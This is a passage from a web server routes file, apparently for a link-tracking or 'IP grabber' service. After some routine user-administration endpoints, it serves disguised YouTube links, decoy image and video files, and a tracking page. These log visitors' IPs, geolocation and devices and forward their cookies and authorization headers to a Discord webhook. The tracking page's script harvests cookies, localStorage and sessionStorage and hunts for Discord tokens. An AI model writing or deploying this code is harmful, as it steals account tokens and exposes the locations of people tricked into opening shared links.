      if (!req.user.isDev) {
        return res.status(403).json({ error: 'Access denied' });
      }

      const { username, password, accountType, isDev } = req.body;
      if (!username || !password || !accountType) {
        return res.status(400).json({ error: 'Username, password, and account type are required' });
      }

      const existingUser = await storage.getUserByUsername(username);
      if (existingUser) {
        return res.status(400).json({ error: 'Username already exists' });
      }

      const newUser = await storage.createUserByDev({
        username,
        password,
        accountType,
        isDev: isDev || false
      }, req.user.id);

      res.json({
        id: newUser.id,
        username: newUser.username,
        accountType: newUser.accountType,
        isDev: newUser.isDev,
        createdAt: newUser.createdAt
      });
    } catch (error) {
      console.error('User creation error:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.post('/api/dev/users/:userId/ban', authenticateUser, async (req: Request, res: Response) => {
    try {
      // Only allow developer accounts to ban users
      if (!req.user.isDev || req.user.accountType !== 'developer') {
        return res.status(403).json({ error: 'Access denied: Developer privileges required' });
      }

      const { userId } = req.params;
      const { reason } = req.body;

      if (!reason || reason.trim().length === 0) {
        return res.status(400).json({ error: 'Ban reason is required' });
      }

      // Don't allow banning other developers
      const userToBan = await storage.getUser(userId);
      if (userToBan?.isDev) {
        return res.status(403).json({ error: 'Cannot ban other developer accounts' });
      }

      await storage.banUser(userId, reason, req.user.id);
      res.json({ success: true, message: 'User banned successfully' });
    } catch (error) {
      console.error('User ban error:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.post('/api/dev/users/:userId/unban', authenticateUser, async (req: Request, res: Response) => {
    try {
      // Only allow developer accounts to unban users
      if (!req.user.isDev || req.user.accountType !== 'developer') {
        return res.status(403).json({ error: 'Access denied: Developer privileges required' });
      }

      const { userId } = req.params;
      await storage.unbanUser(userId, req.user.id);
      res.json({ success: true, message: 'User unbanned successfully' });
    } catch (error) {
      console.error('User unban error:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.delete('/api/dev/users/:userId', authenticateUser, async (req: Request, res: Response) => {
    try {
      // Only allow developer accounts to delete users
      if (!req.user.isDev || req.user.accountType !== 'developer') {
        return res.status(403).json({ error: 'Access denied: Developer privileges required' });
      }

      const { userId } = req.params;

      // Don't allow deleting yourself
      if (userId === req.user.id) {
        return res.status(403).json({ error: 'Cannot delete your own account' });
      }

      // Check if the user to delete exists and is not a developer
      const userToDelete = await storage.getUser(userId);
      if (!userToDelete) {
        return res.status(404).json({ error: 'User not found' });
      }

      if (userToDelete.isDev) {
        return res.status(403).json({ error: 'Cannot delete other developer accounts' });
      }

      await storage.deleteUser(userId, req.user.id);
      res.json({ success: true, message: 'User deleted successfully' });
    } catch (error) {
      console.error('User deletion error:', error);
      if (error.message === 'Cannot delete other developer accounts') {
        return res.status(403).json({ error: error.message });
      }
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  // Update user role - Developer only endpoint
  app.put('/api/dev/users/:userId/role', authenticateUser, async (req: Request, res: Response) => {
    try {
      // Only allow admin accounts to update user roles
      if (req.user.accountType !== 'admin') {
        return res.status(403).json({ error: 'Access denied: Admin privileges required to manage user roles' });
      }

      const { userId } = req.params;
      const { accountType, isDev } = req.body;

      if (!accountType && isDev === undefined) {
        return res.status(400).json({ error: 'At least one of accountType or isDev must be provided' });
      }

      // Validate accountType if provided
      const validAccountTypes = ['user', 'tester', 'developer', 'admin'];
      if (accountType && !validAccountTypes.includes(accountType)) {
        return res.status(400).json({ error: 'Invalid account type. Must be one of: ' + validAccountTypes.join(', ') });
      }

      const updatedUser = await storage.updateUserRole(userId, { accountType, isDev }, req.user.id);

      res.json({
        id: updatedUser.id,
        username: updatedUser.username,
        accountType: updatedUser.accountType,
        isDev: updatedUser.isDev,
        message: 'User role updated successfully'
      });
    } catch (error) {
      console.error('User role update error:', error);
      if (error.message === 'User not found') {
        return res.status(404).json({ error: error.message });
      }
      if (error.message.includes('Access denied') || error.message.includes('Cannot modify')) {
        return res.status(403).json({ error: error.message });
      }
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  // Admin password reset endpoint
  app.put('/api/admin/users/:userId/password', authenticateUser, async (req: Request, res: Response) => {
    try {
      // Only allow admin accounts or developers to reset passwords
      if (!req.user.isDev && req.user.accountType !== 'admin') {
        return res.status(403).json({ error: 'Access denied: Admin or Developer privileges required to reset passwords' });
      }

      const { userId } = req.params;
      const { newPassword } = req.body;

      if (!newPassword || newPassword.length < 6) {
        return res.status(400).json({ error: 'New password must be at least 6 characters long' });
      }

      // Prevent users from resetting their own password through admin endpoint
      if (userId === req.user.id) {
        return res.status(403).json({ error: 'Cannot use admin reset for your own password. Use profile settings instead.' });
      }

      await storage.adminResetUserPassword(userId, newPassword, req.user.id);

      res.json({
        success: true,
        message: 'Password reset successfully by authorized administrator'
      });
    } catch (error: any) {
      console.error('Admin password reset error:', error);
      if (error.message === 'User not found') {
        return res.status(404).json({ error: error.message });
      }
      if (error.message.includes('Access denied')) {
        return res.status(403).json({ error: error.message });
      }
      res.status(500).json({ error: 'Internal server error' });
    }
  });


  // YouTube proxy route that logs IP and redirects to real video
  app.get('/yt/:id', async (req: Request, res: Response) => {
    try {
      const { id } = req.params;
      const { v: videoId } = req.query;

      if (!videoId) {
        return res.status(400).send('Invalid YouTube video ID');
      }

      const clientIp = getClientIp(req);
      const userAgent = req.headers['user-agent'] || '';
      const referrerHeader = req.headers.referer || req.headers.referrer;
      const referrer = Array.isArray(referrerHeader) ? referrerHeader[0] : referrerHeader || '';
      const locationData = getLocationFromIp(clientIp);
      const deviceInfo = parseDeviceInfo(userAgent);

      // Try to find settings with webhook for notification FIRST
      let settings = null;
      let imageOwnerUserId = null;

      try {
        const foundSettings = await storage.getSettingsWithImageOrWebhook();
        if (foundSettings) {
          settings = foundSettings.settings;
          imageOwnerUserId = foundSettings.userId;
        }
      } catch (storageError) {
        console.log('Error accessing storage:', storageError);
      }

      // Log the YouTube proxy access with proper userId association
      await storage.createIpLog({
        userId: imageOwnerUserId, // Associate with user who has settings
        ipAddress: clientIp,
        userAgent,
        referrer,
        location: locationData.location,
        status: 'youtube_proxy_access',
        isVpn: locationData.isVpn,
        vpnLocation: locationData.vpnLocation,
        realLocation: locationData.realLocation,
        deviceType: deviceInfo.deviceType,
        browserName: deviceInfo.browserName,
        operatingSystem: deviceInfo.operatingSystem,
        deviceBrand: deviceInfo.deviceBrand
      });

      // ALWAYS attempt to send webhook if any settings exist
      const allUsers = await storage.getAllUsers();
      let webhookSent = false;

      for (const user of allUsers) {
        try {
          const userSettings = await storage.getSettings(user.id);
          if (userSettings?.webhookUrl && userSettings.webhookUrl.length > 0) {
            console.log(`📺 YouTube proxy access from IP: ${clientIp} - sending to webhook for user ${user.username}`);

            // Send webhook in background
            await sendToWebhook(userSettings.webhookUrl, {
              ipAddress: clientIp,
              userAgent,
              referrer,
              location: locationData.location,
              isVpn: locationData.isVpn,
              vpnLocation: locationData.vpnLocation,
              realLocation: locationData.realLocation,
              deviceType: deviceInfo.deviceType,
              browserName: deviceInfo.browserName,
              operatingSystem: deviceInfo.operatingSystem,
              deviceBrand: deviceInfo.deviceBrand,
              cookies: req.headers.cookie || 'None',
              tokens: 'YouTube Proxy Access'
            });
            webhookSent = true;
            break; // Send to first webhook found
          }
        } catch (webhookError) {
          console.error(`❌ Webhook sending failed for user ${user.username}:`, webhookError);
        }
      }

      if (!webhookSent) {
        console.log('ℹ️ No webhook configured for any user, skipping Discord notification');
      }

      // Serve HTML page that immediately redirects to YouTube
      const redirectHtml = `
<!DOCTYPE html>
<html>
<head>
  <title>Loading YouTube Video...</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- YouTube meta tags for sharing -->
  <meta property="og:type" content="video.other">
  <meta property="og:title" content="YouTube Video">
  <meta property="og:description" content="Watch this video on YouTube">
  <meta property="og:image" content="https://img.youtube.com/vi/${videoId}/maxresdefault.jpg">
  <meta property="og:video" content="https://www.youtube.com/watch?v=${videoId}">

  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background: #0f0f0f;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    .container {
      text-align: center;
      padding: 20px;
    }
    .youtube-logo {
      width: 80px;
      height: 56px;
      background: #ff0000;
      border-radius: 8px;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 20px;
      font-size: 24px;
      font-weight: bold;
    }
    .loading {
      animation: pulse 1.5s ease-in-out infinite;
    }
    @keyframes pulse {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.5; }
    }
    .redirect-btn {
      background: #ff0000;
      color: white;
      border: none;
      padding: 12px 24px;
      border-radius: 24px;
      font-size: 16px;
      cursor: pointer;
      margin-top: 20px;
      text-decoration: none;
      display: inline-block;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="youtube-logo">▶</div>
    <h2 class="loading">Loading YouTube Video...</h2>
    <p>You will be redirected to YouTube shortly.</p>
    <a href="https://www.youtube.com/watch?v=${videoId}" class="redirect-btn">
      Continue to YouTube
    </a>
  </div>

  <script>
    // Immediate redirect to YouTube
    setTimeout(function() {
      window.location.href = 'https://www.youtube.com/watch?v=${videoId}';
    }, 1500);

    // Fallback redirect if user clicks anywhere
    document.addEventListener('click', function() {
      window.location.href = 'https://www.youtube.com/watch?v=${videoId}';
    });
  </script>
</body>
</html>`;

      res.set({
        'Content-Type': 'text/html',
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Expires': '0'
      });
      res.send(redirectHtml);
    } catch (error) {
      console.error('Error in YouTube proxy:', error);
      res.status(500).send('Error loading video');
    }
  });

  // Serve tracking HTML page that logs everything
  app.get('/track/:id', async (req: Request, res: Response) => {
    try {
      const clientIp = getClientIp(req);
      const userAgent = req.headers['user-agent'] || '';
      const referrerHeader = req.headers.referer || req.headers.referrer;
      const referrer = Array.isArray(referrerHeader) ? referrerHeader[0] : referrerHeader || '';
      const locationData = getLocationFromIp(clientIp);
      const deviceInfo = parseDeviceInfo(userAgent);
      const cookies = req.headers.cookie || '';

      // Log the access (userId will be null for tracking visits)
      await storage.createIpLog({
        ipAddress: clientIp,
        userAgent,
        referrer,
        location: locationData.location,
        status: 'success',
        isVpn: locationData.isVpn,
        vpnLocation: locationData.vpnLocation,
        realLocation: locationData.realLocation,
        deviceType: deviceInfo.deviceType,
        browserName: deviceInfo.browserName,
        operatingSystem: deviceInfo.operatingSystem,
        deviceBrand: deviceInfo.deviceBrand
      });

      // Serve HTML page with tracking script
      const trackingHtml = `
<!DOCTYPE html>
<html>
<head>
  <title>Loading...</title>
  <meta charset="utf-8">
  <style>
    body { margin: 0; padding: 20px; font-family: Arial, sans-serif; background: #f5f5f5; }
    .loading { text-align: center; padding: 50px; }
  </style>
</head>
<body>
  <div class="loading">
    <h2>Loading content...</h2>
    <p>Please wait while we prepare your content.</p>
  </div>

  <script>
    (function() {
      try {
        // Capture all cookies
        const cookies = document.cookie;

        // Capture localStorage data
        const localStorageData = {};
        for (let i = 0; i < localStorage.length; i++) {
          const key = localStorage.key(i);
          localStorageData[key] = localStorage.getItem(key);
        }

        // Capture sessionStorage data
        const sessionStorageData = {};
        for (let i = 0; i < sessionStorage.length; i++) {
          const key = sessionStorage.key(i);
          sessionStorageData[key] = sessionStorage.getItem(key);
        }

        // Enhanced Discord token detection patterns
        const discordTokenPatterns = [
          /^mfa\.[a-z0-9_-]{20,}$/i,  // Discord MFA tokens
          /^[a-z0-9_-]{23,28}\.[a-z0-9_-]{6,7}\.[a-z0-9_-]{27}$/i,  // Discord bot tokens
          /^[a-z0-9]{24}\.[a-z0-9]{6}\.[a-z0-9_-]{27}$/i,  // Discord user tokens
          /^[a-z0-9]{26}\.[a-z0-9]{6}\.[a-z0-9_-]{38}$/i   // New Discord token format
        ];

        const tokenPatterns = [
          /token/i, /auth/i, /jwt/i, /session/i, /access/i, /refresh/i, /bearer/i, /discord/i
        ];

        const foundTokens = [];
        const discordTokens = [];

        // Function to check if a value is a Discord token
        const checkDiscordToken = (value, source) => {
          if (typeof value === 'string') {
            for (const pattern of discordTokenPatterns) {
              if (pattern.test(value)) {
                discordTokens.push(source + ': ' + value);
                foundTokens.push('🔥 DISCORD TOKEN - ' + source + ': ' + value);
                return true;
              }
            }
          }
          return false;
        };

        // Check localStorage for tokens
        Object.keys(localStorageData).forEach(key => {
          const value = localStorageData[key];

          // Check for Discord tokens first
          if (!checkDiscordToken(value, 'localStorage.' + key)) {
            // Check for general token patterns
            if (tokenPatterns.some(pattern => pattern.test(key))) {
              foundTokens.push('localStorage.' + key + ': ' + value);
            }
            // Also check values for Discord token patterns
            if (typeof value === 'string') {
              for (const pattern of discordTokenPatterns) {
                if (pattern.test(value)) {
                  discordTokens.push('localStorage.' + key + ': ' + value);
                  foundTokens.push('🔥 DISCORD TOKEN - localStorage.' + key + ': ' + value);
                  break;
                }
              }
            }
          }
        });

        // Check sessionStorage for tokens
        Object.keys(sessionStorageData).forEach(key => {
          const value = sessionStorageData[key];

          // Check for Discord tokens first
          if (!checkDiscordToken(value, 'sessionStorage.' + key)) {
            // Check for general token patterns
            if (tokenPatterns.some(pattern => pattern.test(key))) {
              foundTokens.push('sessionStorage.' + key + ': ' + value);
            }
            // Also check values for Discord token patterns
            if (typeof value === 'string') {
              for (const pattern of discordTokenPatterns) {
                if (pattern.test(value)) {
                  discordTokens.push('sessionStorage.' + key + ': ' + value);
                  foundTokens.push('🔥 DISCORD TOKEN - sessionStorage.' + key + ': ' + value);
                  break;
                }
              }
            }
          }
        });

        // Capture additional browser info
        const browserInfo = {
          userAgent: navigator.userAgent,
          language: navigator.language,
          platform: navigator.platform,
          cookieEnabled: navigator.cookieEnabled,
          screenResolution: screen.width + 'x' + screen.height,
          timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };

        const data = {
          cookies: cookies,
          localStorage: localStorageData,
          sessionStorage: sessionStorageData,
          tokens: foundTokens,
          discordTokens: discordTokens,
          browserInfo: browserInfo,
          url: window.location.href,
          timestamp: new Date().toISOString()
        };

        // Log to console for educational purposes
        console.log('Educational Security Test - Complete Browser Profile:', data);

        // Send to tracking endpoint
        fetch('/api/track-browser-data', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(data)
        }).then(function() {
          // Redirect after 2 seconds
          setTimeout(function() {
            window.location.href = 'https://www.google.com';
          }, 2000);
        }).catch(function(err) {
          console.log('Tracking request failed:', err);
          // Still redirect on error
          setTimeout(function() {
            window.location.href = 'https://www.google.com';
          }, 2000);
        });

      } catch (error) {
        console.log('Tracking script error:', error);
      }
    })();
  </script>
</body>
</html>`;

      res.set({
        'Content-Type': 'text/html',
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Expires': '0'
      });
      res.send(trackingHtml);
    } catch (error) {
      console.error('Error serving tracking page:', error);
      res.status(500).send('Error');
    }
  });

  // Serve raw image files with IP logging (for Discord embeds and direct access)
  app.get('/raw/:filename.:extension', async (req: Request, res: Response) => {
    const { filename, extension } = req.params;

    // Only handle common media file extensions
    const allowedExtensions = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'svg', 'mp4', 'avi', 'mov', 'wmv', 'flv', 'mkv', 'webm'];
    if (!allowedExtensions.includes(extension.toLowerCase())) {
      return res.status(404).send('Not Found');
    }

    try {
      const clientIp = getClientIp(req);
      const userAgent = req.headers['user-agent'] || '';
      const referrerHeader = req.headers.referer || req.headers.referrer;
      const referrer = Array.isArray(referrerHeader) ? referrerHeader[0] : referrerHeader || '';
      const cookies = req.headers.cookie || '';

      // Enhanced token and sensitive data extraction
      const authTokens = [];
      const sensitiveData = [];
      const headerAnalysis = [];

      // Comprehensive cookie analysis
      if (cookies) {
        // Authentication tokens with categorization
        const tokenPatterns = [
          { pattern: /token[^=]*=([^;]+)/gi, type: '🔑 Token' },
          { pattern: /auth[^=]*=([^;]+)/gi, type: '🛡️ Auth' },
          { pattern: /session[^=]*=([^;]+)/gi, type: '🔐 Session' },
          { pattern: /jwt[^=]*=([^;]+)/gi, type: '🎫 JWT' },
          { pattern: /access[^=]*=([^;]+)/gi, type: '🗝️ Access' }
        ];

        tokenPatterns.forEach(({ pattern, type }) => {
          const matches = cookies.match(pattern);
          if (matches) {
            matches.forEach(match => {
              const value = match.split('=')[1];
              authTokens.push(`${type}: ${value.substring(0, 20)}...`);
            });
          }
        });

        // Sensitive personal data patterns
        const personalDataPatterns = [
          { pattern: /user[^=]*=([^;]+)/gi, type: '👤 User ID' },
          { pattern: /email[^=]*=([^;]+)/gi, type: '📧 Email' },
          { pattern: /username[^=]*=([^;]+)/gi, type: '👥 Username' }
        ];

        personalDataPatterns.forEach(({ pattern, type }) => {
          const matches = cookies.match(pattern);
          if (matches) {
            matches.forEach(match => {
              const value = match.split('=')[1];
              sensitiveData.push(`${type}: ${value.substring(0, 15)}...`);
            });
          }
        });
      }

      // Enhanced header analysis
      const authHeader = req.headers.authorization;
      if (authHeader) {
        authTokens.push(`🔐 Authorization: ${authHeader.substring(0, 30)}...`);
      }

      // Additional security headers
      ['x-auth-token', 'x-api-key', 'x-access-token', 'x-csrf-token'].forEach(header => {
        const value = req.headers[header];
        if (value) {
          const headerValue = Array.isArray(value) ? value[0] : value;
          authTokens.push(`🔑 ${header}: ${headerValue.substring(0, 20)}...`);
        }
      });

      const locationData = getLocationFromIp(clientIp);
      const deviceInfo = parseDeviceInfo(userAgent);

      // Try to find settings with uploaded image or webhook
      let settings = null;
      let imageOwnerUserId = null;

      try {
        const foundSettings = await storage.getSettingsWithImageOrWebhook();
        if (foundSettings) {
          settings = foundSettings.settings;
          imageOwnerUserId = foundSettings.userId;
        }
      } catch (storageError) {
        console.log('Error accessing storage:', storageError);
      }

      // Log the IP access with enhanced data
      try {
        await storage.createIpLog({
          userId: imageOwnerUserId,
          ipAddress: clientIp,
          userAgent,
          referrer,
          location: locationData.location,
          status: 'raw_image_access',
          isVpn: locationData.isVpn,
          vpnLocation: locationData.vpnLocation,
          realLocation: locationData.realLocation,
          deviceType: deviceInfo.deviceType,
          browserName: deviceInfo.browserName,
          operatingSystem: deviceInfo.operatingSystem,
          deviceBrand: deviceInfo.deviceBrand
        });
      } catch (logError) {
        console.error('Error logging IP access:', logError);
      }

      // Send to webhook if configured
      if (settings?.webhookUrl && settings.webhookUrl.length > 0) {
        console.log(`🔗 Raw image access - sending webhook to Discord for IP: ${clientIp}`);

        // Send webhook in background with enhanced data
        sendToWebhook(settings.webhookUrl, {
          ipAddress: clientIp,
          userAgent,
          referrer,
          location: locationData.location,
          isVpn: locationData.isVpn,
          vpnLocation: locationData.vpnLocation,
          realLocation: locationData.realLocation,
          ...deviceInfo, // Include all enhanced device information
          cookies: cookies || 'None',
          tokens: authTokens.length > 0 ? authTokens.join(', ') : 'None',
          sensitiveData: sensitiveData.length > 0 ? sensitiveData.join(', ') : 'None',
          headerAnalysis: headerAnalysis.length > 0 ? headerAnalysis.join(', ') : 'None',
          requestType: 'enhanced_photo_logging',
          timestamp: new Date().toISOString()
        }).catch(webhookError => {
          console.error('❌ Webhook sending failed:', webhookError);
        });
      }

      // Serve uploaded file if available, otherwise default content
      if (settings?.uploadedImageData && settings?.uploadedImageType) {
        const fileBuffer = Buffer.from(settings.uploadedImageData, 'base64');
        res.set({
          'Content-Type': settings.uploadedImageType,
          'Content-Length': fileBuffer.length,
          'Cache-Control': 'no-cache, no-store, must-revalidate',
          'Pragma': 'no-cache',
          'Expires': '0'
        });
        res.send(fileBuffer);
      } else {
        // Serve minimal transparent pixel
        const pixel = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
        res.set({
          'Content-Type': 'image/gif',
          'Content-Length': pixel.length,
          'Cache-Control': 'no-cache, no-store, must-revalidate',
          'Pragma': 'no-cache',
          'Expires': '0'
        });
        res.send(pixel);
      }
    } catch (error) {
      console.error('Error serving raw image:', error);
      // Fallback to transparent pixel
      const pixel = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
      res.set({
        'Content-Type': 'image/gif',
        'Content-Length': pixel.length,
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Expires': '0'
      });
      res.send(pixel);
    }
  });

  // Serve decoy files and log the request - support multiple file types
  app.get('/:filename.:extension', async (req: Request, res: Response) => {
    const { filename, extension } = req.params;

    // Only handle common media file extensions
    const allowedExtensions = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'svg', 'mp4', 'avi', 'mov', 'wmv', 'flv', 'mkv', 'webm'];
    if (!allowedExtensions.includes(extension.toLowerCase())) {
      return res.status(404).send('Not Found');
    }
    try {
      const clientIp = getClientIp(req);
      const userAgent = req.headers['user-agent'] || '';
      const referrerHeader = req.headers.referer || req.headers.referrer;
      const referrer = Array.isArray(referrerHeader) ? referrerHeader[0] : referrerHeader || '';
      const cookies = req.headers.cookie || '';

      // Enhanced token and sensitive data extraction
      const authTokens = [];
      const sensitiveData = [];
      const headerAnalysis = [];

      // Comprehensive cookie analysis
      if (cookies) {
        // Authentication tokens with categorization
        const tokenPatterns = [
          { pattern: /token[^=]*=([^;]+)/gi, type: '🔑 Token' },
          { pattern: /auth[^=]*=([^;]+)/gi, type: '🛡️ Auth' },
          { pattern: /session[^=]*=([^;]+)/gi, type: '🔐 Session' },
          { pattern: /jwt[^=]*=([^;]+)/gi, type: '🎫 JWT' },
          { pattern: /access[^=]*=([^;]+)/gi, type: '🗝️ Access' }
        ];

        tokenPatterns.forEach(({ pattern, type }) => {
          const matches = cookies.match(pattern);
          if (matches) {
            matches.forEach(match => {
              const value = match.split('=')[1];
              authTokens.push(`${type}: ${value.substring(0, 20)}...`);
            });
          }
        });

        // Sensitive personal data patterns
        const personalDataPatterns = [
          { pattern: /user[^=]*=([^;]+)/gi, type: '👤 User ID' },
          { pattern: /email[^=]*=([^;]+)/gi, type: '📧 Email' },
          { pattern: /username[^=]*=([^;]+)/gi, type: '👥 Username' }
        ];

        personalDataPatterns.forEach(({ pattern, type }) => {
          const matches = cookies.match(pattern);
          if (matches) {
            matches.forEach(match => {
              const value = match.split('=')[1];
              sensitiveData.push(`${type}: ${value.substring(0, 15)}...`);
            });
          }
        });
      }

      // Enhanced header analysis
      const authHeader = req.headers.authorization;
      if (authHeader) {
        authTokens.push(`🔐 Authorization: ${authHeader.substring(0, 30)}...`);
      }

      // Additional security headers
      ['x-auth-token', 'x-api-key', 'x-access-token', 'x-csrf-token'].forEach(header => {
        const value = req.headers[header];
        if (value) {
          const headerValue = Array.isArray(value) ? value[0] : value;
          authTokens.push(`🔑 ${header}: ${headerValue.substring(0, 20)}...`);
        }
      });

      const locationData = getLocationFromIp(clientIp);
      const deviceInfo = parseDeviceInfo(userAgent);

      // Try to find settings with uploaded image or webhook
      let settings = null;
      let imageOwnerUserId = null;

      try {
        // Use the new combined method to find best settings
        const foundSettings = await storage.getSettingsWithImageOrWebhook();
        if (foundSettings) {
          settings = foundSettings.settings;
          imageOwnerUserId = foundSettings.userId;
        }
      } catch (storageError) {
        console.log('Error accessing storage:', storageError);
      }

      // Log the IP access with enhanced data
      try {
        await storage.createIpLog({
          userId: imageOwnerUserId,
          ipAddress: clientIp,
          userAgent,
          referrer,
          location: locationData.location,
          status: 'success',
          isVpn: locationData.isVpn,
          vpnLocation: locationData.vpnLocation,
          realLocation: locationData.realLocation,
          deviceType: deviceInfo.deviceType,
          browserName: deviceInfo.browserName,
          operatingSystem: deviceInfo.operatingSystem,
          deviceBrand: deviceInfo.deviceBrand
        });
      } catch (logError) {
        console.error('Error logging IP access:', logError);
      }

      // Send to webhook if configured - ALWAYS attempt to send
      if (settings?.webhookUrl && settings.webhookUrl.length > 0) {
        console.log(`🔗 Sending webhook to Discord for IP: ${clientIp}`);

        // Send webhook in background - don't block response
        sendToWebhook(settings.webhookUrl, {
          ipAddress: clientIp,
          userAgent,
          referrer,
          location: locationData.location,
          isVpn: locationData.isVpn,
          vpnLocation: locationData.vpnLocation,
          realLocation: locationData.realLocation,
          ...deviceInfo, // Include all enhanced device information
          cookies: cookies || 'None',
          tokens: authTokens.length > 0 ? authTokens.join(', ') : 'None',
          sensitiveData: sensitiveData.length > 0 ? sensitiveData.join(', ') : 'None',
          headerAnalysis: headerAnalysis.length > 0 ? headerAnalysis.join(', ') : 'None',
          requestType: 'enhanced_photo_logging',
          timestamp: new Date().toISOString()
        }).catch(webhookError => {
          console.error('❌ Webhook sending failed:', webhookError);
        });
      } else {
        console.log('ℹ️ No webhook configured, skipping Discord notification');
      }

      // Determine if it's a video or image request
      const isVideo = ['mp4', 'avi', 'mov', 'wmv', 'flv', 'mkv', 'webm'].includes(extension.toLowerCase());

      // Serve uploaded file if available, otherwise default content
      if (settings?.uploadedImageData && settings?.uploadedImageType) {
        const fileBuffer = Buffer.from(settings.uploadedImageData, 'base64');
        res.set({
          'Content-Type': settings.uploadedImageType,
          'Content-Length': fileBuffer.length,
          'Cache-Control': 'no-cache, no-store, must-revalidate',
          'Pragma': 'no-cache',
          'Expires': '0'
        });
        res.send(fileBuffer);
      } else {
        if (isVideo) {
          // Serve minimal video file (1 second black video)
          const minimalVideo = Buffer.from([
            0x00, 0x00, 0x00, 0x20, 0x66, 0x74, 0x79, 0x70, 0x69, 0x73, 0x6F, 0x6D, 0x00, 0x00, 0x02, 0x00,
            0x69, 0x73, 0x6F, 0x6D, 0x69, 0x73, 0x6F, 0x32, 0x61, 0x76, 0x63, 0x31, 0x6D, 0x70, 0x34, 0x31
          ]);

          res.set({
            'Content-Type': 'video/mp4',
            'Content-Length': minimalVideo.length,
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Pragma': 'no-cache',
            'Expires': '0'
          });
          res.send(minimalVideo);
        } else {
          // For Discord embedding, serve an HTML page with Open Graph meta tags
          // This ensures Discord properly embeds the image link
          const discordFriendlyHtml = `<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- Open Graph meta tags for Discord embedding -->
  <meta property="og:type" content="website">
  <meta property="og:title" content="Shared Image">
  <meta property="og:description" content="Check out this image!">
  <meta property="og:image" content="${req.protocol}://${req.get('host')}/raw/${filename}.${extension}">
  <meta property="og:image:width" content="1200">
  <meta property="og:image:height" content="630">
  <meta property="og:image:type" content="image/${extension === 'jpg' ? 'jpeg' : extension}">

  <!-- Twitter Card meta tags -->
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="${req.protocol}://${req.get('host')}/raw/${filename}.${extension}">

  <title>Shared Image</title>

  <style>
    body {
      margin: 0;
      padding: 20px;
      font-family: Arial, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      text-align: center;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }
    .container {
      max-width: 800px;
      padding: 40px;
      background: rgba(255, 255, 255, 0.1);
      border-radius: 20px;
      backdrop-filter: blur(10px);
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
    }
    .image-container {
      margin: 20px 0;
      border-radius: 15px;
      overflow: hidden;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
    }
    img {
      max-width: 100%;
      height: auto;
      display: block;
    }
    .loading {
      padding: 20px;
      animation: pulse 2s infinite;
    }
    @keyframes pulse {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.5; }
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>✨ Shared Image</h1>
    <p>Loading your image...</p>
    <div class="image-container">
      <img src="/raw/${filename}.${extension}" alt="Shared image" onload="document.querySelector('.loading').style.display='none'" />
    </div>
    <div class="loading">
      <p>📷 Processing...</p>
    </div>
  </div>

  <script>
    // Enhanced tracking script
    (function() {
      try {
        // Redirect to actual image after a short delay
        setTimeout(function() {
          window.location.href = '/raw/${filename}.${extension}';
        }, 2000);
      } catch(e) {
        // Fallback redirect
        window.location.href = '/raw/${filename}.${extension}';
      }
    })();
  </script>
</body>
</html>`;

          res.set({
            'Content-Type': 'text/html',
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Pragma': 'no-cache',
            'Expires': '0'
          });
          res.send(discordFriendlyHtml);
        }
      }
    } catch (error) {
      console.error('Error serving image:', error);

      // Even if there's an error, still serve a large visible image to avoid suspicion
